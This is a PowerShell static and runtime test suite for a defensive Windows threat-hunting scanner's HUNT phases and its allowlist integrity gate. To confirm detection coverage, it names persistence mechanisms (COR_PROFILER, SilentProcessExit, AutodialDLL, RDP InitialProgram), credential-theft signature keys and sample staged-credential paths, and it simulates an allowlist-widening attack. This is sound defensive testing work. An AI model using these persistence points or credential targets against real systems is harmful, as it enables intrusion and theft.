<#
.SYNOPSIS
    Static (AST) regression tests for the WS7 HUNT band and the preflight integrity gate.

.DESCRIPTION
    Guards the invariants that cannot be checked by running the code on Linux:
    the rule-#1 posture of the band, the module-trap rule, the WOW64 helpers, the
    four-way phase-ceiling mirror, and the allowlist integrity gate.

    Every assertion pulls the real source via the PowerShell parser, so a test cannot
    drift from the code it guards.
#>
[CmdletBinding()]
param()
$ErrorActionPreference = 'Stop'
$root = Split-Path -Parent (Split-Path -Parent $PSScriptRoot)
$fail = 0; $pass = 0
function Assert-That { param([string]$Name,$Actual,$Expected)
    if ("$Actual" -eq "$Expected") { $script:pass++; Write-Host "  [PASS] $Name" -ForegroundColor DarkGreen }
    else { $script:fail++; Write-Host "  [FAIL] $Name — expected '$Expected', got '$Actual'" -ForegroundColor Red }
}
function Assert-True { param([string]$Name,$Cond) Assert-That $Name ([bool]$Cond) $true }

function Get-Ast { param([string]$Rel)
    $p = Join-Path $root $Rel
    if (-not (Test-Path $p)) { return $null }
    $e=$null; $t=$null
    $a = [System.Management.Automation.Language.Parser]::ParseFile((Resolve-Path $p).Path,[ref]$t,[ref]$e)
    if ($e -and $e.Count) { throw "parse errors in ${Rel}: $($e[0].Message)" }
    return $a
}

Write-Host "`n=== WS7 HUNT BAND (134-162) + PREFLIGHT — STATIC ===" -ForegroundColor Cyan

$newModules = @('engine/Phases-0.ps1','engine/Phases-5.ps1','engine/Phases-6.ps1','engine/Phases-7.ps1')

# ── 1. Rule #1: nothing in the new band may be auto-selected for a destructive fix ──
# A CRITICAL/HIGH finding with a destructive FixAction is auto-ticked in the GUI. This
# band has never met a live fleet and several phases fire on healthy managed endpoints
# (an EDR looks exactly like a rootkit to phases 141-143), so it is Info throughout.
foreach ($rel in $newModules) {
    $ast = Get-Ast $rel
    if ($null -eq $ast) { Assert-True "$rel exists" $false; continue }
    $calls = $ast.FindAll({ param($n)
        $n -is [System.Management.Automation.Language.CommandAst] -and
        "$($n.GetCommandName())" -eq 'Add-Finding' }, $true)
    $bad = 0; $total = 0
    foreach ($c in $calls) {
        $total++
        $els = $c.CommandElements
        $fix = $null
        for ($i=0; $i -lt $els.Count-1; $i++) {
            if ($els[$i] -is [System.Management.Automation.Language.CommandParameterAst] -and
                $els[$i].ParameterName -eq 'FixAction') { $fix = "$($els[$i+1].Value)"; break }
        }
        if ($fix -ne 'Info') { $bad++; Write-Host "        non-Info FixAction '$fix' in $rel" -ForegroundColor DarkYellow }
    }
    Assert-That "$rel — every Add-Finding is FixAction Info ($total calls)" $bad 0
}

# ── 2. Module-level trap must be the FIRST statement ───────────────────────────
# The loader's trap resumes at the next dot-sourced MODULE, so without this a single
# terminating error skips every remaining phase in the file. This exact bug once
# silently dropped phases 17-58 in production.
# A trap is NOT a statement in the AST — it hangs off EndBlock.Traps. (Asserting on
# Statements[0] silently fails even for the known-correct Phases-4.ps1, which is how
# this assertion was caught agreeing for the wrong reason.) So check textually: a
# module-level trap exists, and NOTHING EXECUTABLE precedes it. Only the BOM, blank
# lines and comment lines may come first — the deliberate-vocabulary notice is a
# comment header and does not change what runs. An executable statement before the
# trap is the real defect, because that statement runs unprotected.
$trapPreamble = '^\uFEFF?(?:[ \t]*(?:#[^\r\n]*)?\r?\n)*[ \t]*trap \{ Write-RecoveredError \$_; continue \}'
foreach ($rel in $newModules) {
    $ast = Get-Ast $rel
    if ($null -eq $ast) { continue }
    Assert-True "$rel — has a module-level trap" (@($ast.EndBlock.Traps).Count -ge 1)
    $raw = Get-Content (Join-Path $root $rel) -Raw
    Assert-True "$rel — nothing executable precedes the trap" ("$raw" -match $trapPreamble)
}
# Control: the pre-existing modules must satisfy the same rule, so a future refactor
# that breaks the convention fails here rather than in production.
foreach ($rel in @('engine/Phases-1.ps1','engine/Phases-2.ps1','engine/Phases-3.ps1','engine/Phases-4.ps1')) {
    $ast = Get-Ast $rel
    Assert-True "$rel — has a module-level trap (control)" (@($ast.EndBlock.Traps).Count -ge 1)
}

# ── 3. Phase-gated bodies carry their own inner trap ──────────────────────────
foreach ($rel in @('engine/Phases-5.ps1','engine/Phases-6.ps1','engine/Phases-7.ps1')) {
    $src = Get-Content (Join-Path $root $rel) -Raw
    Assert-True "$rel — `$PhasePlan.Hunt block has an inner trap" `
        ($src -match '(?s)if \(\$PhasePlan\.Hunt\) \{\s*\r?\n\s*trap \{ Write-RecoveredError')
}

# ── 4. Phase ceiling 162 is mirrored in every place that must agree ───────────
$loader = Get-Content (Join-Path $root 'Scythe-V23.ps1') -Raw
$srv    = Get-Content (Join-Path $root 'Scythe-Server.ps1') -Raw
$py     = Get-Content (Join-Path $root '_python/server.py') -Raw
Assert-True 'loader  — HUNT PhasePlan Max=162'      ($loader -match '"HUNT"\s*\{\s*@\{\s*Min=1;\s*Max=162')
Assert-True 'loader  — HUNT in -Mode ValidateSet'   ($loader -match 'ValidateSet\("","QUICK","FULL","DEEP","PARANOID","STEALTH","HUNT"\)')
Assert-True 'loader  — HUNT sets PhasePlan.Hunt'    ($loader -match '"HUNT"\s*\{[^}]*Hunt=\$true')
Assert-True 'PS srv  — MODE_PHASES HUNT=162'        ($srv -match 'HUNT=162')
Assert-True 'PS srv  — HUNT accepted as a mode'     ($srv -match "'QUICK','FULL','DEEP','PARANOID','STEALTH','HUNT'")
Assert-True 'py srv  — MODE_PHASES HUNT 162'        ($py  -match '"HUNT":\s*162')
# The Python mirror was integer-only and silently dropped fractional phases (55.5 etc).
Assert-True 'py srv  — PHASE_RE captures fractional phases' ($py -match 'PHASE\\s\+\(\\d\+\(\?:\\\.\\d\+\)\?\)')

# ── 5. Loader dot-sources every module, in execution order ────────────────────
$order = @('Phases-0','Phases-1','Phases-2','Phases-3','Phases-4','Phases-5','Phases-6','Phases-7','Summary','FixMode')
$idx = @($order | ForEach-Object { $loader.IndexOf("engine\$_.ps1") })
Assert-True 'loader  — all 10 engine modules dot-sourced' (@($idx | Where-Object { $_ -lt 0 }).Count -eq 0)
$sorted = $true
for ($i=1; $i -lt $idx.Count; $i++) { if ($idx[$i] -le $idx[$i-1]) { $sorted = $false } }
Assert-True 'loader  — dot-source order is execution order' $sorted

# ── 6. WOW64 truth: the engine knows its own bitness and can escape redirection ──
Assert-True 'loader  — SCYTHE_IS_WOW64 computed'   ($loader -match '\$global:SCYTHE_IS_WOW64\s*=\s*\(\(-not \[Environment\]::Is64BitProcess\)')
Assert-True 'loader  — SCYTHE_SYS32 uses Sysnative' ($loader -match "SCYTHE_SYS32.*Sysnative")
foreach ($fn in @('Get-RegVal64','Get-RegNames64','Get-RegSubKeys64')) {
    Assert-True "loader  — $fn defined" ($loader -match "function $fn\b")
    Assert-True "loader  — $fn uses the 64-bit registry view" `
        ($loader -match "(?s)function $fn\b.*?RegistryView\]::Registry64")
}
$p5 = Get-Content (Join-Path $root 'engine/Phases-5.ps1') -Raw
Assert-True 'Phase 134 reads TaskCache through the 64-bit view' `
    ($p5 -match '(?s)Get-ScytheTaskTreeLeaves.*?Get-RegNames64')

# ── 7. Allowlist integrity gate (ADVERSARY_ANALYSIS E1) ──────────────────────
Assert-True 'loader  — Join-AllowRegex sanitises before compiling' `
    ($loader -match '(?s)function Join-AllowRegex.*?Test-AllowPatternSafety')
Assert-True 'loader  — refusals are recorded for reporting' `
    ($loader -match '(?s)function Join-AllowRegex.*?SCYTHE_SIG_TAMPER')
Assert-True 'loader  — an emptied allowlist still fails closed to (?!)' `
    ($loader -match '(?s)function Join-AllowRegex.*?if \(\$keep\.Count -eq 0\) \{ return ''\(\?\!\)'' \}')
Assert-True 'loader  — Test-AllowPatternSafety enforces a match timeout' `
    ($loader -match '(?s)function Test-AllowPatternSafety.*?FromMilliseconds\(150\)')
$p0 = Get-Content (Join-Path $root 'engine/Phases-0.ps1') -Raw
Assert-True 'Phase 0 — reports refused signature entries'  ($p0 -match 'PF_SIGTAMPER_')
Assert-True 'Phase 0 — reports WOW64 redirection'          ($p0 -match 'PF_WOW64_REDIRECTED')
Assert-True 'Phase 0 — verifies the integrity manifest'    ($p0 -match 'integrity_manifest\.json')
Assert-True 'Phase 0 — emits no numbered PHASE header'     (-not ($p0 -match 'Show-PhaseHeader "PHASE \d'))
Assert-True 'Phase 0 — hands the phase counter back at 0'  ($p0 -match '\$global:CURRENT_PHASE_NUM = 0')

# ── 8. Signature-DB hygiene for the new keys ─────────────────────────────────
$sig = Get-Content (Join-Path $root 'data/detection_signatures.json') -Raw -Encoding UTF8 | ConvertFrom-Json
$canaries = @('C:\Windows\System32\svchost.exe','HKLM:\SOFTWARE\Vendor\Product','9','zqx','Some Product Name 2026')
$newKeys = @('hunt_task_benign_paths','hunt_service_benign_names','hunt_ppid_benign_paths',
             'hunt_driver_benign_names','hunt_timestomp_benign_paths','hunt_filename_benign_paths',
             'hunt_memory_benign_paths')
foreach ($k in $newKeys) {
    Assert-True "sig — key '$k' present" ($null -ne $sig.$k)
    $univ = 0; $nocomp = 0
    foreach ($pat in @($sig.$k)) {
        $rx = $null
        try { $rx = New-Object System.Text.RegularExpressions.Regex($pat,'IgnoreCase',[TimeSpan]::FromMilliseconds(150)) }
        catch { $nocomp++; continue }
        $all = $true
        foreach ($c in $canaries) { if (-not $rx.IsMatch($c)) { $all = $false; break } }
        if ($all) { $univ++ }
    }
    Assert-That "sig — '$k' all patterns compile" $nocomp 0
    Assert-That "sig — '$k' has no universal pattern" $univ 0
}
foreach ($k in @('clr_unexpected_hosts','system_image_names','killchain_stages')) {
    Assert-True "sig — detection key '$k' present and non-empty" (@($sig.$k).Count -gt 0)
}
# The Phase-6 auto-kill lists take a bare substring match; a short entry collides with
# real software. These new lists are anchored whole-name at load, but keep the floor.
$short = 0
foreach ($n in @($sig.clr_unexpected_hosts)) { if ("$n".Length -lt 3) { $short++ } }
Assert-That 'sig — no clr_unexpected_hosts entry shorter than 3 chars' ([int]$short) 0

# ── 9. Safe-wrapper discipline in the new modules ────────────────────────────
# The four unsafe cmdlets are matched through the AST, not the raw text. A text match
# also fires on the cmdlet NAME appearing inside a -Description string — and it legitimately
# does: this band is FixAction "Info", so the description IS the remediation, and telling an
# operator to run 'Get-AuthenticodeSignature <path>' is exactly the right instruction to give
# them. The AST distinguishes a command being INVOKED from a command being NAMED in prose,
# which is the distinction the rule was always about. (Proven to still bite: injecting a real
# call into any of these modules fails the assertion.)
$unsafeCmdlets = @('Get-AuthenticodeSignature','Get-ItemPropertyValue','Get-WinEvent','Get-FileHash')
foreach ($rel in @('engine/Phases-0.ps1','engine/Phases-5.ps1','engine/Phases-6.ps1','engine/Phases-7.ps1')) {
    $src = Get-Content (Join-Path $root $rel) -Raw
    $modAst = Get-Ast $rel
    $invoked = @()
    if ($null -ne $modAst) {
        $invoked = @($modAst.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true) |
                     ForEach-Object { $_.GetCommandName() } | Where-Object { $_ })
    }
    foreach ($cmd in $unsafeCmdlets) {
        Assert-That "$rel — no raw $cmd invocation" (@($invoked | Where-Object { $_ -eq $cmd }).Count) 0
    }
    # Deliberate design constraint: no P/Invoke anywhere in this band. Declaring
    # OpenProcess/ReadProcessMemory/VirtualQueryEx is the code shape AV heuristics flag,
    # and an engine Defender blocks at load detects nothing at all.
    Assert-True "$rel — no P/Invoke (AMSI posture)"       (-not ($src -match 'DllImport|Add-Type\s+-TypeDefinition'))
    # Get-ScanFiles returns ,$arr — piping it delivers the whole array as ONE item.
    Assert-True "$rel — Get-ScanFiles is never piped directly" (-not ($src -match 'Get-ScanFiles[^\r\n]*\|\s*(Where|ForEach)'))
}

# ── 10. Cross-view phases must actually consult two sources ──────────────────
Assert-True 'Phase 134 — compares registry against Get-ScheduledTask' `
    ($p5 -match '(?s)PHASE 134.*?Get-ScheduledTask.*?Get-ScytheTaskTreeLeaves|(?s)Get-ScytheTaskTreeLeaves.*?PHASE 134.*?Get-ScheduledTask')
Assert-True 'Phase 135 — compares registry against Win32_Service'   ($p5 -match '(?s)PHASE 135.*?Win32_Service')
Assert-True 'Phase 138 — compares registry against Win32_SystemDriver' ($p5 -match '(?s)PHASE 138.*?Win32_SystemDriver')
Assert-True 'Phase 144 — compares PEB path against WMI path'        ($p5 -match '(?s)PHASE 144.*?ExecutablePath')
Assert-True 'Phase 141 — uses ProcessThread start addresses'        ($p5 -match 'StartAddress')
Assert-True 'Phase 141 — bounds module ranges by ModuleMemorySize'  ($p5 -match 'ModuleMemorySize')

# ── 11. RUNTIME: the E1 blinding attack must actually be closed ──────────────
# The static checks above prove the sanitiser is WIRED. This proves it WORKS, by pulling
# Test-AllowPatternSafety and Join-AllowRegex out of the shipped loader via the AST and
# executing them against a poisoned signature set — the exact attack from
# ADVERSARY_ANALYSIS.md E1: do not delete a detection (a missing key fails closed and is
# conspicuous), widen an allowlist instead, because allowlists fail OPEN.
Write-Host "`n-- runtime: signature-set integrity gate --" -ForegroundColor Cyan
$loaderAst = Get-Ast 'Scythe-V23.ps1'
$wanted = @('Test-AllowPatternSafety','Join-AllowRegex')
$defs = $loaderAst.FindAll({ param($n)
    $n -is [System.Management.Automation.Language.FunctionDefinitionAst] -and
    $wanted -contains $n.Name }, $true)
Assert-That 'both integrity functions extracted from the loader' $defs.Count 2
$global:SCYTHE_SIG_TAMPER = New-Object System.Collections.Generic.List[string]
$script:SIGSTUB = $null
function Get-Sig([string]$Name) { if ($script:SIGSTUB -and $null -ne $script:SIGSTUB[$Name]) { @($script:SIGSTUB[$Name]) } else { @() } }
foreach ($d in $defs) { . ([scriptblock]::Create($d.Extent.Text)) }

# (a) a healthy allowlist survives untouched
$script:SIGSTUB = @{ k = @('\\AppData\\Roaming\\Vendor\\', '\.tmp$') }
$global:SCYTHE_SIG_TAMPER.Clear()
$r = Join-AllowRegex 'k'
Assert-True  'healthy allowlist compiles through unchanged' ($r -eq '\\AppData\\Roaming\\Vendor\\|\.tmp$')
Assert-That  'healthy allowlist records no tampering' $global:SCYTHE_SIG_TAMPER.Count 0

# (b) THE ATTACK: one entry widened to '.*' must be refused, not honoured
$script:SIGSTUB = @{ k = @('\\AppData\\Roaming\\Vendor\\', '.*') }
$global:SCYTHE_SIG_TAMPER.Clear()
$r = Join-AllowRegex 'k'
Assert-True  'universal pattern is DROPPED from the compiled allowlist' ($r -notmatch '\.\*')
Assert-True  'the legitimate sibling entry survives'  ($r -eq '\\AppData\\Roaming\\Vendor\\')
Assert-That  'the refusal is recorded for reporting'  $global:SCYTHE_SIG_TAMPER.Count 1
Assert-True  'the refusal names the offending key'    ("$($global:SCYTHE_SIG_TAMPER[0])" -match '^k:')
Assert-True  'the refusal is described as UNIVERSAL'  ("$($global:SCYTHE_SIG_TAMPER[0])" -match 'UNIVERSAL')

# (c) other universal spellings are caught too — '.*' is not the only way to say it
foreach ($u in @('.+', '^.*$', '(?s).*', '[\s\S]*', '.*|foo', '')) {
    $script:SIGSTUB = @{ k = @($u) }
    $global:SCYTHE_SIG_TAMPER.Clear()
    $r = Join-AllowRegex 'k'
    Assert-True "universal/empty spelling '$u' is refused (fails closed to (?!))" ($r -eq '(?!)')
}

# (d) an allowlist emptied by sanitising must suppress NOTHING, never everything.
# This is the fail-closed direction and it is the whole point: a blinded phase must go
# noisy, not silent.
$script:SIGSTUB = @{ k = @('.*') }
$r = Join-AllowRegex 'k'
Assert-True 'a fully-refused allowlist suppresses nothing' (-not ([regex]::IsMatch('C:\Windows\evil.exe', $r)))

# (e) a catastrophic-backtracking pattern is refused rather than hanging the scan
$script:SIGSTUB = @{ k = @('(a+)+$') }
$global:SCYTHE_SIG_TAMPER.Clear()
$sw = [System.Diagnostics.Stopwatch]::StartNew()
$r = Join-AllowRegex 'k'
$sw.Stop()
Assert-True 'backtracking-bait pattern does not hang the load (<3s)' ($sw.Elapsed.TotalSeconds -lt 3)

# (f) an absent key still fails closed — the pre-existing contract must not regress
$script:SIGSTUB = @{}
Assert-That 'an absent allowlist key still yields (?!)' (Join-AllowRegex 'nope') '(?!)'


# ── 12. Phases 147 / 157 / 158 / 159 — structure and the deliberate narrowings ─
Write-Host "`n-- phases 147/157/158/159 (tasks F1/F4/F5/F7) --" -ForegroundColor Cyan
$p6 = Get-Content (Join-Path $root 'engine/Phases-6.ps1') -Raw
$p6ast = Get-Ast 'engine/Phases-6.ps1'

foreach ($n in @(146,147,148,149,150,151,152,153,154,155,156,157,158,159)) {
    Assert-True "Phase $n — header present in Phases-6" ($p6 -match ('Show-PhaseHeader "PHASE {0}"' -f $n))
}
# Phases run in NUMERIC order inside a module and every one of them reuses variables set by
# the ones before it, so the order in the file is not cosmetic. 148-152 were spliced between
# two already-shipped phases; this is what catches a re-splice landing in the wrong place.
$p6Order = @(146,147,148,149,150,151,152,153,154,155,156,157,158,159) |
           ForEach-Object { $p6.IndexOf(('Show-PhaseHeader "PHASE {0}"' -f $_)) }
$p6Sorted = @($p6Order | Sort-Object)
Assert-True 'Phases-6 — every phase header appears in numeric order' `
    ((($p6Order -join ',') -eq ($p6Sorted -join ',')) -and ($p6Order -notcontains -1))
# Phases run in numeric order within a module. 147 must precede 153.
Assert-True 'Phases-6 — 146 is emitted before 147' `
    ($p6.IndexOf('Show-PhaseHeader "PHASE 146"') -lt $p6.IndexOf('Show-PhaseHeader "PHASE 147"'))
Assert-True 'Phases-6 — 147 is emitted before 153' `
    ($p6.IndexOf('Show-PhaseHeader "PHASE 147"') -lt $p6.IndexOf('Show-PhaseHeader "PHASE 153"'))
Assert-True 'Phases-6 — 157 is emitted after 156' `
    ($p6.IndexOf('Show-PhaseHeader "PHASE 157"') -gt $p6.IndexOf('Show-PhaseHeader "PHASE 156"'))

# Helpers are defined unconditionally, before the $PhasePlan gate, so they exist in every
# mode and the AST tests can find them (module skeleton rule, 00_INTEGRATION_ENGINE.md).
$p6Funcs = @($p6ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true) |
             ForEach-Object { $_.Name })
foreach ($fn in @('Test-ScytheNameRule','Test-ScytheTextRules','Resolve-ScytheModulePath',
                  'Test-ScytheUntrustedModule','Get-ScytheRepoRoots','Get-ScytheEspRoot',
                  'Get-ScytheEvents','Get-ScytheEvtField','Test-ScytheDomainJoined',
                  'ConvertTo-ScytheSeverity','Invoke-ScytheConsoleTool')) {
    Assert-True "Phases-6 — helper $fn is defined" ($p6Funcs -contains $fn)
    Assert-True "Phases-6 — helper $fn is defined OUTSIDE the PhasePlan gate" `
        ($p6.IndexOf("function $fn") -lt $p6.IndexOf('if ($PhasePlan.Hunt) {'))
}

# Phase 159 narrows F7 the way 153-156 narrowed F6: it reads an ALREADY-mounted ESP and
# mounts nothing itself. Revert-proofed, because "leave nothing behind on a client
# machine" is the standing rule the narrowing exists to honour (audit M5/M9/M10).
foreach ($mutator in @('mountvol','Add-PartitionAccessPath','Remove-PartitionAccessPath','Set-Partition','New-Partition','Format-Volume')) {
    $invokedNames = @($p6ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true) |
                      ForEach-Object { $_.GetCommandName() } | Where-Object { $_ })
    Assert-That "Phase 159 — never invokes $mutator" (@($invokedNames | Where-Object { $_ -eq $mutator }).Count) 0
}
# Confirm-SecureBootUEFI THROWS on legacy BIOS rather than returning false, so the whole
# phase has to degrade cleanly. Prove the call is guarded and that the non-UEFI path
# still reports (a skipped check that leaves no trace reads as a pass in the report).
Assert-True 'Phase 159 — Confirm-SecureBootUEFI is wrapped in try/catch' `
    ($p6 -match '(?s)try \{ \$sbState = \[bool\]\(Confirm-SecureBootUEFI[^\r\n]*\}\s*\r?\n\s*catch')
Assert-True 'Phase 159 — reports the legacy-BIOS case instead of skipping silently' `
    ($p6 -match 'BOOT159_LEGACYBIOS')
Assert-True 'Phase 159 — reports an unmounted ESP rather than claiming it is clean' `
    ($p6 -match 'BOOT159_ESP_UNMOUNTED')
Assert-True 'Phase 159 — compares the ESP boot binary against the servicing copy' `
    ($p6 -match '(?s)PHASE 159.*?Boot\\EFI.*?Get-FileHashSafe')

# Phase 147 must never read the opaque token caches — reading a TokenBroker cache or an
# NGC key container makes this tool the credential-theft primitive it looks for.
Assert-True 'Phase 147 — consults cloud_cred_never_read before content-scanning' `
    ($p6 -match '(?s)CLOUD_CRED_NEVER_READ.*?Test-ContentRules')
Assert-True 'Phase 147 — does not put the matched secret in the description' `
    ($p6 -match 'deliberately NOT reproduced here')

# Phase 157: every mechanism the brief names is actually reached.
$mech = @{
    'COR_PROFILER'          = 'COR_PROFILER'
    'SilentProcessExit'     = 'SilentProcessExit'
    'WER ReflectDebugger'   = 'ReflectDebugger'
    'AutodialDLL'           = 'AutodialDLL'
    'ShellServiceObjectDelayLoad' = 'ShellServiceObjectDelayLoad'
    'SharedTaskScheduler'   = 'SharedTaskScheduler'
    'RDP InitialProgram'    = 'InitialProgram'
    'Service trigger start' = 'TriggerInfo'
    'AppDomainManager sidecar' = 'appDomainManager'
}
foreach ($k in ($mech.Keys | Sort-Object)) {
    Assert-True "Phase 157 — covers $k" ($p6 -match $mech[$k])
}
# ...and these six are phase 126's, in engine/Phases-4.ps1 via extended_autostart_points.
# Phase 126 runs whenever HUNT runs ($PhasePlan.Extended is true for HUNT), so covering them
# here produced TWO findings with different IDs and different severities for one artifact —
# which phase 160 then correlates on the shared target as though it were two independent
# facts. Revert-proofed in both directions: re-adding one here fails, and so does losing it
# from 126.
$p4 = Get-Content (Join-Path $root 'engine/Phases-4.ps1') -Raw
# Ownership is checked against the PARSED autostart points, not the raw JSON: in the file
# every backslash is doubled, so a path-shaped regex silently matches nothing there and the
# assertion would pass for the wrong reason.
$eas126 = (@($sig.extended_autostart_points) | ForEach-Object { "$($_.key)|$($_.name)" }) -join "`n"
# Duplication is checked against the CODE only. A comment that names the mechanism and says
# phase 126 owns it is documentation, and stripping comments is what keeps this assertion
# from firing on the note that explains it.
$p6Code = (($p6 -split "`r?`n") | Where-Object { $_ -notmatch '^\s*#' }) -join "`n"
$owned126 = @{
    'Active Setup StubPath' = 'Active Setup\\Installed Components'
    'Netsh helper DLLs'     = 'Microsoft\\Netsh'
    'Print Monitors'        = 'Print\\Monitors'
    'Time Providers'        = 'W32Time\\TimeProviders'
    'SCRNSAVE.EXE'          = 'SCRNSAVE\.EXE'
    'Winsock LSP catalogue' = 'Protocol_Catalog9'
}
foreach ($k in ($owned126.Keys | Sort-Object)) {
    Assert-True "phase 126 still owns $k"          (($p4 -match $owned126[$k]) -or ($eas126 -match $owned126[$k]))
    Assert-True "phase 157 does NOT duplicate $k"  (-not ($p6Code -match $owned126[$k]))
}
Assert-True 'Phase 157 — signature verification carries the SIG_AUDIT budget' `
    ($p6 -match '(?s)function Test-ScytheUntrustedModule.*?SIG_AUDIT_MAX_FILES.*?SIG_AUDIT_DEADLINE_S')
Assert-True 'Phase 157 — reports an incomplete signature pass' ($p6 -match 'PERS157_SIGBUDGET')
Assert-True 'Phase 157 — COR_PROFILER ignores an explicitly disabled profiler' ($p6 -match '\[int\]\$enabled -eq 0')
Assert-True 'Phase 157 — RDP InitialProgram is signature-gated' ($p6 -match 'Test-ScytheUntrustedModule \$initMod')
Assert-True 'Phase 159 — tells a legacy-BIOS box apart from an unreadable check' `
    (($p6 -match 'BOOT159_SB_UNREADABLE') -and ($p6 -match 'firmware_type'))
Assert-True 'Phase 158 — repository discovery is memoised' ($p6 -match 'SCYTHE_REPO_ROOTS')
# Out-Typewriter has NO 'OK' case: the line reaches the GUI with no [OK ] bracket tag and the
# server falls back to prose classification — the §5.1 audit bug. 'GOOD' is the tag.
foreach ($rel in @('engine/Phases-0.ps1','engine/Phases-5.ps1','engine/Phases-6.ps1','engine/Phases-7.ps1')) {
    $src = Get-Content (Join-Path $root $rel) -Raw
    Assert-True "$rel — no Out-Typewriter level 'OK' (use GOOD)" (-not ($src -match 'Out-Typewriter[^\r\n]*"OK"'))
}
# HKLM\SOFTWARE reads go through the 64-bit view or a 32-bit engine reads Wow6432Node.
Assert-True 'Phase 157 — reads HKLM through the 64-bit helpers' `
    ($p6 -match '(?s)PHASE 157.*?Get-RegSubKeys64' -and $p6 -match '(?s)PHASE 157.*?Get-RegVal64')
# Phase 158 must ignore the stock hook samples, or every developer box reports findings.
# The brief is explicit that the extension-bundle C2 check must REUSE phase 130's webhook
# rule set rather than grow a second copy that then drifts out of step with it.
Assert-True 'Phase 158 — reuses the existing webhook/C2 rule set, not a second copy' `
    ($p6 -match '\$WEBHOOK_C2_RULES' -and -not ($p6 -match "Get-Sig 'webhook"))
Assert-True 'Phase 158 — skips .sample git hooks' ($p6 -match '\$\(\$hf\.Name\)" -match ''\(\?i\)\\\.sample\$''')

# ── 13. Signature-DB hygiene for the F1/F4/F5/F7 keys ────────────────────────
Write-Host "`n-- signature hygiene: the new keys --" -ForegroundColor Cyan
$newBandKeys = @('cloud_cred_paths_raw','cloud_cred_never_read','cloud_cred_text_formats',
                 'cloud_cred_content_rules','cloud_cred_staging_dirs_raw','cloud_cred_staged_names',
                 'cloud_cred_access_tools','cloud_cred_benign_paths',
                 'persist_dropper_extensions','persist_dropper_content_rules',
                 'persist_profiler_benign_names','persist_dll_benign_paths',
                 'persist_service_trigger_benign_names',
                 'devtool_paths_raw','devtool_hook_rules','devtool_gitconfig_rules',
                 'devtool_vscode_startup_rules','devtool_registry_rules','devtool_benign_paths',
                 'esp_expected_paths','esp_boot_binaries','bcd_unsafe_flags','dbx_current_baseline')
foreach ($k in $newBandKeys) {
    Assert-True "sig — key '$k' present and non-empty" ($null -ne $sig.$k -and @($sig.$k).Count -gt 0)
    Assert-True "sig — key '$k' carries a _comment" ($null -ne $sig."_comment_$k")
}
# Every one of these keys is pulled by the LOADER, never by the phase body — that is what
# Test-Extended-Band's orphan check keys off, and what keeps the AMSI posture intact.
foreach ($k in $newBandKeys) {
    Assert-True "loader — pulls '$k'" ($loader -match "(?:Get-Sig|Join-AllowRegex) '$k'")
}
# *_raw lists hold $env: variables and are expanded ONCE, in the loader.
foreach ($k in @('cloud_cred_paths_raw','cloud_cred_staging_dirs_raw','devtool_paths_raw')) {
    Assert-True "sig — '$k' entries are `$env:-prefixed literals" `
        (@(@($sig.$k) | Where-Object { "$_" -notmatch '^\$env:' }).Count -eq 0)
    Assert-True "loader — '$k' is ExpandString-expanded at load" `
        ($loader -match "(?s)Get-Sig '$k'\) \| ForEach-Object \{ \`$ExecutionContext\.InvokeCommand\.ExpandString")
}
# Allowlists: compile, and none universal (the E1 blinding attack).
$newAllowKeys = @('cloud_cred_benign_paths','persist_profiler_benign_names','persist_dll_benign_paths',
                  'persist_service_trigger_benign_names','devtool_benign_paths')
foreach ($k in $newAllowKeys) {
    $univ = 0; $nocomp = 0
    foreach ($pat in @($sig.$k)) {
        $rx = $null
        try { $rx = New-Object System.Text.RegularExpressions.Regex($pat,'IgnoreCase',[TimeSpan]::FromMilliseconds(150)) }
        catch { $nocomp++; continue }
        $all = $true
        foreach ($c in $canaries) { if (-not $rx.IsMatch($c)) { $all = $false; break } }
        if ($all) { $univ++ }
    }
    Assert-That "sig — '$k' all patterns compile" $nocomp 0
    Assert-That "sig — '$k' has no universal pattern" $univ 0
}
# Plain regex-list keys (no 'regex' in the name, so Test-Extended-Band's sweep skips them).
foreach ($k in @('cloud_cred_never_read','cloud_cred_text_formats','cloud_cred_staged_names',
                 'cloud_cred_access_tools','esp_expected_paths')) {
    $nocomp = 0
    foreach ($pat in @($sig.$k)) {
        try { [void](New-Object System.Text.RegularExpressions.Regex($pat,'IgnoreCase',[TimeSpan]::FromMilliseconds(150))) }
        catch { $nocomp++ }
    }
    Assert-That "sig — '$k' all patterns compile" $nocomp 0
}
# The service NAME is attacker-controlled, so every trigger-allowlist entry pins the ENTIRE
# string — a prefix pattern lets malware self-allowlist by naming its service after a Windows
# one (the failure class caught in review 2026-07-02).
foreach ($pat in @($sig.persist_service_trigger_benign_names)) {
    Assert-True "sig — trigger allowlist entry is fully anchored: $pat" `
        ($pat -match '\^' -and $pat -match '\$$')
}

# ── 14. The FP traps these two allowlists are specifically able to fall into ──
Write-Host "`n-- allowlists must not swallow their own detection branch --" -ForegroundColor Cyan
function Join-BandAllow { param([string]$Key) $a = @($sig.$Key); if ($a.Count) { ($a -join '|') } else { '(?!)' } }
$cloudAllow   = Join-BandAllow 'cloud_cred_benign_paths'
$devtoolAllow = Join-BandAllow 'devtool_benign_paths'

# Phase 147 branch (c) fires on credential material staged in these directories. An
# allowlist entry covering one of them would make the branch unreachable dead code — the
# exact failure phase 130's discord entry shipped with.
foreach ($staged in @('C:\Users\tech\AppData\Local\Temp\credentials',
                      'C:\Users\tech\Downloads\id_rsa',
                      'C:\Users\tech\Desktop\msal_token_cache.bin',
                      'C:\Users\Public\azureProfile.json',
                      'C:\ProgramData\kubeconfig',
                      'C:\Users\tech\Downloads\aws_creds.zip')) {
    Assert-True "cloud allowlist does NOT swallow staged '$staged'" (-not ($staged -match $cloudAllow))
}
# ...while still suppressing the package trees it exists for.
foreach ($noise in @('C:\repo\node_modules\aws-sdk\test\credentials',
                     'C:\Python311\Lib\site-packages\botocore\.aws\credentials',
                     'C:\repo\tests\fixtures\.npmrc',
                     'C:\Program Files\Amazon\AWSCLIV2\examples\credentials')) {
    Assert-True "cloud allowlist DOES suppress package-tree noise '$noise'" ($noise -match $cloudAllow)
}
# Phase 158's git-hook branch reads .git\hooks. Allowlisting '.git' outright would kill it.
foreach ($hook in @('C:\Users\dev\source\repos\app\.git\hooks\post-checkout',
                    'C:\Users\dev\source\repos\app\.git\hooks\pre-commit',
                    'C:\Users\dev\source\repos\app\.git\config')) {
    Assert-True "devtool allowlist does NOT swallow '$hook'" (-not ($hook -match $devtoolAllow))
}
foreach ($noise in @('C:\Users\dev\source\repos\app\node_modules\pkg\package.json',
